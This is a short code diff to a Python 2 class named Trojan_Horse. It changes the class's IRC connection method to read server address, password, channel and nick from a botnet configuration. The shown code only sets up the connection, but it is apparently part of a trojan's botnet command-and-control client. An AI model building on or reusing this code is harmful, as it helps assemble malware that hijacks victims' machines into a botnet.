@@ -6,13 +6,13 @@ class Trojan_Horse():
     def __init__(self):
         pass
     
-    def connect(self, server):
-        HOST = server[0]
-        PORT = server[1]
-        PASS = ""
-        self.CHAN = server[2]
-        NICK = server[3]
-        IDENT = server[4]
+    def connect(self, botnet):
+        HOST = botnet.irc_addr.split(':')[0]
+        PORT = int(botnet.irc_addr.split(':')[1])
+        PASS = botnet.irc_server_pwd
+        self.CHAN = botnet.irc_channel.split(', ')
+        NICK = botnet.irc_nick
+        IDENT = botnet.irc_user
         NAMES = []
         readbuffer = ""
         closed = 0
@@ -38,7 +38,7 @@ class Trojan_Horse():
         except socket.error, e:
             print "Error: %s while connecting to the IRC server!" % e[1]
             return NAMES
-        except e:
+        except Exception, e:
             print "unknown error: %s" % e
             return NAMES
         while closed != 1:
